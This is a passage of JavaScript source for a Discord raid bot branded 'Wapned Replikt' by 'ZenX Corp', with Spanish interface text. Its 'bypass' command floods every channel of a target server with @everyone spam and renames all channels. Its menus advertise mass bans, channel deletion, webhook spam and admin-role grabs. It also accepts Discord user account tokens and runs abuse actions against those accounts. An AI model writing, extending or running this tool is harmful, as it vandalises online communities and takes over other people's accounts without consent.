            await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: ${wh_i} webhooks obtenidas correctamente.`)],});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"bypass"){
        try {
            let guildxd_id = ``;
            if(msg.channel.isDMBased()){
                if(users_data[msg.author.id].guild_id){
                    guildxd_id = users_data[msg.author.id].guild_id;
                } else {
                    await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Necesitas seleccionar un servidor con \`${prefix_1}join <guild_id>\``)]})
                    return;
                }
            } else {
                guildxd_id = msg.guild.id;
                await msg.delete();
            };
            let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "https://discord.gg/RR2qSCG45d";
            let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "https://discord.gg/RR2qSCG45d";
            const guildxd = client.guilds.cache.get(guildxd_id);
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)
                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **💎 Intel Bot‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ \ncomando \`${msg.content}\` ejecutado correctamente\n\n**guild: ${guildxd.name}**\n**users: \`${guildxd.memberCount}\`**\n**channels: \`${guildxd.channels.cache.size}\`**\n\n:earth_americas: action by: ${msg.author.username}`)
                .setFooter({text:`wapned bot`})
            ]});
            async function spam_ch(ch_id) {
                try {
                    const chxd = guildxd.channels.cache.get(ch_id);
                    for (let index = 0; index < 30; index++) {
                        try {
                            chxd.send({content:`** https://discord.gg/AYRAD4jUdB **\n${txt_atck_}\n ${inv_atck} \n@everyone`, embeds:[
                                new EmbedBuilder()
                                .setTitle(` ‎                           ‎ **SERVER FUCKED BY Intel**\n                                 ‎ **#WAPNED REPLIKT**`)
                                .setDescription(` ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ :gem:\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **🌎 best raid bot.**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ **[HOW TO RAID DISCORD SERVER](**)**\n\n ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ https://discord.gg/zCQ8jQ2GBf`)
                                .setImage(`https://c.tenor.com/eF4-zscgHU4AAAAd/tenor.gif`)
                            ]});
                        } catch (e) {};
                    };
                } catch (e) {
                    console.log(e.message)
                }
            };
            let rm_b=false;
            let rm_i=0;
            async function rename_ch(ch_id, ch_size) {
                try {
                    const res = await fetch(`https://discord.com/api/v9/channels/${ch_id}`,{
                        method:"PATCH",
                        headers:{
                            "Authorization":`Bot ${bot_token}`,
                            "content-type":"application/json"
                        },
                        body: JSON.stringify({
                            name:`bypassed-by-${msg.author.username}`
                        })
                    });
                    const resJson = await res.json();
                    if(res.status === 200){
                        rm_i++;
                    } else {
                        await wait_ms(resJson['retry_after']);
                        await rename_ch(ch_id);
                    };
                    if(rm_i === ch_size && !rm_b){
                        rm_b = true;
                        await msg.author.send({embeds: [new EmbedBuilder().setDescription(`:gem: ${rm_i} canales renombrados correctamente.`)],});
                        return;
                    };
                } catch (e) {
                    console.log(e.message);
                }
            };
            let chs = await guildxd.channels.fetch();
            for (let ch of chs.values()) {
                try {
                    spam_ch(ch.id);
                    await wait_ms(30);
                } catch (e) {
                    console.log(e.message);
                };
            };
            for (let ch of chs.values()) {
                try {
                    rename_ch(ch.id);
                    await wait_ms(30);
                } catch (e) {
                    console.log(e.message);
                };
            };
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_1+"autobypass"){
        try {
            if(msg.channel.isDMBased()){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Comando disponible en Wapned Replikt Premium. Cómpralo en $ ZenX Corp.`)]})
            } else {
                await msg.channel.send({embeds:[new EmbedBuilder().setDescription(`:gem: Comando disponible en Wapned Replikt Premium. Cómpralo en $ ZenX Corp.`)]})
            };
            //Comando disponible en Wapned Replikt Premium. Cómpralo en $ ZenX Corp e.e
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"top"){
        try {
            if(msg.channel.isDMBased()){
                await msg.author.send({embeds:[new EmbedBuilder().setImage(`https://media.discordapp.net/attachments/546763235051700314/1067513693769834527/Tumblr_l_334398575226661.gif?ex=67758b9a&is=67743a1a&hm=fa563d449d4188d325f8f0d109b25bd456398d0934388efceea1bf18c6230899&=&width=576&height=144`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setFooter({text:`$ Replitk Version by ZenX Corp`}).addFields({name:`$ ZenX Corp on top| 1`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 2`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 3`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 4`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 5`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 6`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 7`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 8`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 9`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 10`,value:`** https://discord.gg/zCQ8jQ2GBf  **`})]})
            } else {
                await msg.channel.send({embeds:[new EmbedBuilder().setImage(`https://media.discordapp.net/attachments/546763235051700314/1067513693769834527/Tumblr_l_334398575226661.gif?ex=67758b9a&is=67743a1a&hm=fa563d449d4188d325f8f0d109b25bd456398d0934388efceea1bf18c6230899&=&width=576&height=144`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setFooter({text:`$ Replitk Version by ZenX Corp`}).addFields({name:`$ ZenX Corp on top| 1`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 2`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 3`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 4`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 5`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 6`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 7`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 8`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 9`,value:`** https://discord.gg/zCQ8jQ2GBf  **`},{name:`$ ZenX Corp on top | 10`,value:`** https://discord.gg/zCQ8jQ2GBf  **`})]})
            };
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_1+"premium_commands"){
        try {
            if(msg.channel.isDMBased()){
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:bat: \`${prefix_2}guild.options\` View guild options.\n\n:ninja: \`${prefix_2}guild.info\` View guild information.\n:ninja: \`${prefix_2}guild.view-roles\` View roles.\n:ninja: \`${prefix_2}guild.view-channels\` View channels.\n:ninja: \`${prefix_2}guild.view-hooks\` View hooks.\n:ninja: \`${prefix_2}guild.invite\` View invite.\n\n:ninja: \`${prefix_2}guild.autobypass\` Auto-bypass server security.\n:ninja: \`${prefix_2}guild.spam\` Spam all channels.\n:ninja: \`${prefix_2}guild.nuke\` Delete all channels.\n:ninja: \`${prefix_2}guild.createchannels\` Create 500 channels.\n:ninja: \`${prefix_2}guild.massban\` Ban all users.\n:ninja: \`${prefix_2}guild.webhookspam\` Create and spam hooks.\n:ninja: \`${prefix_2}guild.existentwebhookspam\` Spam existent hooks.\n:ninja: \`${prefix_2}guild.admin\` It gives you a role with admin.\n\n:bat: \`${prefix_2}select-guild\` Select guild.\n:warning: \`${prefix_2}unselect-guild\` Unselect guild.`)]});
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:bat: \`${prefix_2}token.options\` View token options.\n\n:ninja: \`${prefix_2}token.info\` View token information.\n:ninja: \`${prefix_2}token.guilds\` View token guilds.\n\n:ninja: \`${prefix_2}token.admin-guilds\` View token admin guilds.\n:ninja: \`${prefix_2}token.owner-guilds\` View token owner guilds.\n\n:ninja: \`${prefix_2}token.leave-guilds\` Leave all guilds.\n:ninja: \`${prefix_2}token.create-guilds\` Create 100 guilds\n:ninja: \`${prefix_2}token.block-friends\` Block all friends.\n:ninja: \`${prefix_2}token.delete-friends\` Delete all friends.\n:ninja: \`${prefix_2}token.close-mds\` Close all DMS.\n:ninja: \`${prefix_2}token.theme-spam\` Theme spam.\n:ninja: \`${prefix_2}token.region-spam\` Region spam.\n:ninja: \`${prefix_2}token.spam-mds\` Theme spam.\n\n:bat: \`${prefix_2}select-token\` Select token.\n:warning: \`${prefix_2}unselect-token\` Unselect token.`)]});
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:ninja: \`${prefix_3}config.view\` View ur config.\n\n:bat: \`${prefix_3}config.custom-text\` Set custom text.\n:bat: \`${prefix_3}config.custom-invite\` Set custom invite.\n:bat: \`${prefix_3}config.custom-channels\` Set custom channels.\n:bat: \`${prefix_3}config.custom-roles\` Set custom roles.\n\n:ninja: \`${prefix_3}config.fastraid\` Config fastraid.\n:ninja: \`${prefix_3}config.fastbypass\` Config fastbypass.`)]});
            } else {
                await msg.reply({embeds:[
                    new EmbedBuilder()
                    .setTitle('💎 Revisa tu MD!')
                ]});
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:bat: \`${prefix_2}guild.options\` View guild options.\n\n:ninja: \`${prefix_2}guild.info\` View guild information.\n:ninja: \`${prefix_2}guild.view-roles\` View roles.\n:ninja: \`${prefix_2}guild.view-channels\` View channels.\n:ninja: \`${prefix_2}guild.view-hooks\` View hooks.\n:ninja: \`${prefix_2}guild.invite\` View invite.\n\n:ninja: \`${prefix_2}guild.autobypass\` Auto-bypass server security.\n:ninja: \`${prefix_2}guild.spam\` Spam all channels.\n:ninja: \`${prefix_2}guild.nuke\` Delete all channels.\n:ninja: \`${prefix_2}guild.createchannels\` Create 500 channels.\n:ninja: \`${prefix_2}guild.massban\` Ban all users.\n:ninja: \`${prefix_2}guild.webhookspam\` Create and spam hooks.\n:ninja: \`${prefix_2}guild.existentwebhookspam\` Spam existent hooks.\n:ninja: \`${prefix_2}guild.admin\` It gives you a role with admin.\n\n:bat: \`${prefix_2}select-guild\` Select guild.\n:warning: \`${prefix_2}unselect-guild\` Unselect guild.`)]});
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:bat: \`${prefix_2}token.options\` View token options.\n\n:ninja: \`${prefix_2}token.info\` View token information.\n:ninja: \`${prefix_2}token.guilds\` View token guilds.\n\n:ninja: \`${prefix_2}token.admin-guilds\` View token admin guilds.\n:ninja: \`${prefix_2}token.owner-guilds\` View token owner guilds.\n\n:ninja: \`${prefix_2}token.leave-guilds\` Leave all guilds.\n:ninja: \`${prefix_2}token.create-guilds\` Create 100 guilds\n:ninja: \`${prefix_2}token.block-friends\` Block all friends.\n:ninja: \`${prefix_2}token.delete-friends\` Delete all friends.\n:ninja: \`${prefix_2}token.close-mds\` Close all DMS.\n:ninja: \`${prefix_2}token.theme-spam\` Theme spam.\n:ninja: \`${prefix_2}token.region-spam\` Region spam.\n:ninja: \`${prefix_2}token.spam-mds\` Theme spam.\n\n:bat: \`${prefix_2}select-token\` Select token.\n:warning: \`${prefix_2}unselect-token\` Unselect token.`)]});
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:ninja: \`${prefix_3}config.view\` View ur config.\n\n:bat: \`${prefix_3}config.custom-text\` Set custom text.\n:bat: \`${prefix_3}config.custom-invite\` Set custom invite.\n:bat: \`${prefix_3}config.custom-channels\` Set custom channels.\n:bat: \`${prefix_3}config.custom-roles\` Set custom roles.\n\n:ninja: \`${prefix_3}config.fastraid\` Config fastraid.\n:ninja: \`${prefix_3}config.fastbypass\` Config fastbypass.`)]});
            };
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.options"){
        try {
            if(msg.channel.isDMBased()){
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:bat: \`${prefix_2}token.options\` View token options.\n\n:ninja: \`${prefix_2}token.info\` View token information.\n:ninja: \`${prefix_2}token.guilds\` View token guilds.\n\n:ninja: \`${prefix_2}token.admin-guilds\` View token admin guilds.\n:ninja: \`${prefix_2}token.owner-guilds\` View token owner guilds.\n\n:ninja: \`${prefix_2}token.leave-guilds\` Leave all guilds.\n:ninja: \`${prefix_2}token.create-guilds\` Create 100 guilds\n:ninja: \`${prefix_2}token.block-friends\` Block all friends.\n:ninja: \`${prefix_2}token.delete-friends\` Delete all friends.\n:ninja: \`${prefix_2}token.close-mds\` Close all DMS.\n:ninja: \`${prefix_2}token.theme-spam\` Theme spam.\n:ninja: \`${prefix_2}token.region-spam\` Region spam.\n:ninja: \`${prefix_2}token.spam-mds\` Theme spam.\n\n:bat: \`${prefix_2}select-token\` Select token.\n:warning: \`${prefix_2}unselect-token\` Unselect token.`)]});
            } else {
                await msg.reply({embeds:[
                    new EmbedBuilder()
                    .setTitle('💎 Revisa tu MD!')
                ]});
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:bat: \`${prefix_2}token.options\` View token options.\n\n:ninja: \`${prefix_2}token.info\` View token information.\n:ninja: \`${prefix_2}token.guilds\` View token guilds.\n\n:ninja: \`${prefix_2}token.admin-guilds\` View token admin guilds.\n:ninja: \`${prefix_2}token.owner-guilds\` View token owner guilds.\n\n:ninja: \`${prefix_2}token.leave-guilds\` Leave all guilds.\n:ninja: \`${prefix_2}token.create-guilds\` Create 100 guilds\n:ninja: \`${prefix_2}token.block-friends\` Block all friends.\n:ninja: \`${prefix_2}token.delete-friends\` Delete all friends.\n:ninja: \`${prefix_2}token.close-mds\` Close all DMS.\n:ninja: \`${prefix_2}token.theme-spam\` Theme spam.\n:ninja: \`${prefix_2}token.region-spam\` Region spam.\n:ninja: \`${prefix_2}token.spam-mds\` Theme spam.\n\n:bat: \`${prefix_2}select-token\` Select token.\n:warning: \`${prefix_2}unselect-token\` Unselect token.`)]});
            };
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"guild.options"){
        try {
            if(msg.channel.isDMBased()){
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:bat: \`${prefix_2}guild.options\` View guild options.\n\n:ninja: \`${prefix_2}guild.info\` View guild information.\n:ninja: \`${prefix_2}guild.view-roles\` View roles.\n:ninja: \`${prefix_2}guild.view-channels\` View channels.\n:ninja: \`${prefix_2}guild.view-hooks\` View hooks.\n:ninja: \`${prefix_2}guild.invite\` View invite.\n\n:ninja: \`${prefix_2}guild.autobypass\` Auto-bypass server security.\n:ninja: \`${prefix_2}guild.spam\` Spam all channels.\n:ninja: \`${prefix_2}guild.nuke\` Delete all channels.\n:ninja: \`${prefix_2}guild.createchannels\` Create 500 channels.\n:ninja: \`${prefix_2}guild.massban\` Ban all users.\n:ninja: \`${prefix_2}guild.webhookspam\` Create and spam hooks.\n:ninja: \`${prefix_2}guild.existentwebhookspam\` Spam existent hooks.\n:ninja: \`${prefix_2}guild.admin\` It gives you a role with admin.\n\n:bat: \`${prefix_2}select-guild\` Select guild.\n:warning: \`${prefix_2}unselect-guild\` Unselect guild.`)]});
            } else {
                await msg.reply({embeds:[
                    new EmbedBuilder()
                    .setTitle('💎 Revisa tu MD!')
                ]});
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:bat: \`${prefix_2}guild.options\` View guild options.\n\n:ninja: \`${prefix_2}guild.info\` View guild information.\n:ninja: \`${prefix_2}guild.view-roles\` View roles.\n:ninja: \`${prefix_2}guild.view-channels\` View channels.\n:ninja: \`${prefix_2}guild.view-hooks\` View hooks.\n:ninja: \`${prefix_2}guild.invite\` View invite.\n\n:ninja: \`${prefix_2}guild.autobypass\` Auto-bypass server security.\n:ninja: \`${prefix_2}guild.spam\` Spam all channels.\n:ninja: \`${prefix_2}guild.nuke\` Delete all channels.\n:ninja: \`${prefix_2}guild.createchannels\` Create 500 channels.\n:ninja: \`${prefix_2}guild.massban\` Ban all users.\n:ninja: \`${prefix_2}guild.webhookspam\` Create and spam hooks.\n:ninja: \`${prefix_2}guild.existentwebhookspam\` Spam existent hooks.\n:ninja: \`${prefix_2}guild.admin\` It gives you a role with admin.\n\n:bat: \`${prefix_2}select-guild\` Select guild.\n:warning: \`${prefix_2}unselect-guild\` Unselect guild.`)]});
            };
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_3+"config.view"){
        try {
                let txt_atck_ = users_data[msg.author.id]?.text_attack ? users_data[msg.author.id].text_attack : "No definido.";
                let txt_atck = txt_atck_.replace("** https://discord.gg/zCQ8jQ2GBf **\n","");
                let inv_atck = users_data[msg.author.id]?.invite_attack ? users_data[msg.author.id].invite_attack : "No definido.";
                let nm_ch_atck = users_data[msg.author.id]?.nm_channels_attack ? users_data[msg.author.id].nm_channels_attack : "No definido.";
                let nm_rl_atck = users_data[msg.author.id]?.nm_roles_attack ? users_data[msg.author.id].nm_roles_attack : "No definido.";
            if(msg.channel.isDMBased()){
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:ninja: \`${prefix_3}config.view\` View ur config.\n\n:bat: \`${prefix_3}config.custom-text\` Set custom text.\n:bat: \`${prefix_3}config.custom-invite\` Set custom invite.\n:bat: \`${prefix_3}config.custom-channels\` Set custom channels.\n:bat: \`${prefix_3}config.custom-roles\` Set custom roles.\n\n:ninja: \`${prefix_3}config.fastraid\` Config fastraid.\n:ninja: \`${prefix_3}config.fastbypass\` Config fastbypass.`)]});
                await msg.author.send({embeds:[new EmbedBuilder().setTitle(`Your settings:`).setDescription(`:ninja: Text: \`${txt_atck}\`\n:ninja: Invite: \`${inv_atck}\`\n:ninja: Channels name: \`${nm_ch_atck}\`\n:ninja: Roles name: \`${nm_rl_atck}\``).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]});
            } else {
                await msg.reply({embeds:[
                    new EmbedBuilder()
                    .setTitle('💎 Revisa tu MD!')
                ]});
                await msg.author.send({embeds:[new EmbedBuilder().setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`).setDescription(`:ninja: \`${prefix_3}config.view\` View ur config.\n\n:bat: \`${prefix_3}config.custom-text\` Set custom text.\n:bat: \`${prefix_3}config.custom-invite\` Set custom invite.\n:bat: \`${prefix_3}config.custom-channels\` Set custom channels.\n:bat: \`${prefix_3}config.custom-roles\` Set custom roles.\n\n:ninja: \`${prefix_3}config.fastraid\` Config fastraid.\n:ninja: \`${prefix_3}config.fastbypass\` Config fastbypass.`)]});
                await msg.author.send({embeds:[new EmbedBuilder().setTitle(`Your settings:`).setDescription(`:ninja: Text: \`${txt_atck}\`\n:ninja: Invite: \`${inv_atck}\`\n:ninja: Channels name: \`${nm_ch_atck}\`\n:ninja: Roles name: \`${nm_rl_atck}\``).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]});
            };
        } catch (e) {
            console.log(e);
        };
    };
    if(command_3 === "config.custom-text"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            users_data[msg.author.id] = {
                text_attack: content_3
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se actualizó el contenido del at4que.`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(command_3 === "config.custom-invite"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            if(args3.length !== 1){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un argumento.`)]});
                return;
            };
            users_data[msg.author.id] = {
                invite_attack: args3[0]
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se actualizó la invitación del at4que.`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(command_3 === "config.custom-channels"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            if(content_3.length > 100){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: El nombre de los canales no puede pasar los 100 dígitos.`)]});
                return;
            };
            users_data[msg.author.id] = {
                nm_channels_attack: content_3
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se actualizó el nombre de los canales al empezar el at4que.`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
//by $ ZenX Corp e.e
    if(command_3 === "config.custom-roles"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            if(content_3.length > 100){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: El nombre de los roles no puede pasar los 100 dígitos.`)]});
                return;
            };
            users_data[msg.author.id] = {
                nm_roles_attack: content_3
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se actualizó el nombre de los roles al empezar el at4que.`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(command_3 === "config.fastraid"){
        try {
            //Comando disponible en Wapned Replikt Premium. Cómpralo en $ ZenX Corp e.e
            if(msg.channel.isDMBased()){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Esto es para la versión premium del replikt e.e\nCómpralo en ZenX Corp.`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
            } else {
                await msg.channel.send({embeds:[new EmbedBuilder().setDescription(`:gem: Esto es para la versión premium del replikt e.e\nCómpralo en ZenX Corp.`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
            };
        } catch (e) {
            console.log(e.message);
        };
    };
    if(command_3 === "config.fastbypass"){
        try {
            //Comando disponible en Wapned Replikt Premium. Cómpralo en $ ZenX Corp e.e
            if(msg.channel.isDMBased()){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Esto es para la versión premium del replikt e.e\nCómpralo en ZenX Corp.`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
            } else {
                await msg.channel.send({embeds:[new EmbedBuilder().setDescription(`:gem: Esto es para la versión premium del replikt e.e\nCómpralo en ZenX Corp.`).setThumbnail(`https://media.discordapp.net/attachments/1172295274379612210/1211226898047180852/logo-zenx.jpg?ex=67705e34&is=676f0cb4&hm=f090fd67de9298b82926c89c9e6ffdec8849e037ed8c0903727de0b24820aa16&=&format=webp&width=675&height=675`)]})
            };
        } catch (e) {
            console.log(e.message);
        };
    };
    if(command_2 === "select-token"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            const res = await fetch('https://discord.com/api/v9/users/@me',{
                method:"GET",
                headers:{
                    "Authorization": `${args2[0]}`
                }
            });
            if(res.status !== 200){
                await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:x: Debes especificar un token de usuario válido.`)]})
                return;
            };
            users_data[msg.author.id] = {
                token_selected: args2[0]
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se agregó el token!`)]});
        } catch (e) {
            console.log(e.message);
        }
    };
    if(msg.content === prefix_2+"unselect-token"){
        try {
            if(!msg.channel.isDMBased()){
                await msg.channel.send({content:`> Debes colocar este comando en el MD del bot!`});
                return;
            };
            users_data[msg.author.id] = {
                token_selected: ""
            };
            await msg.author.send({embeds:[new EmbedBuilder().setDescription(`:gem: Se eliminó el token!`)]});
        } catch (e) {
            console.log(e.message);
        };
    };
    if(msg.content === prefix_2+"token.info"){
        try {
            if(!msg.channel.isDMBased()){
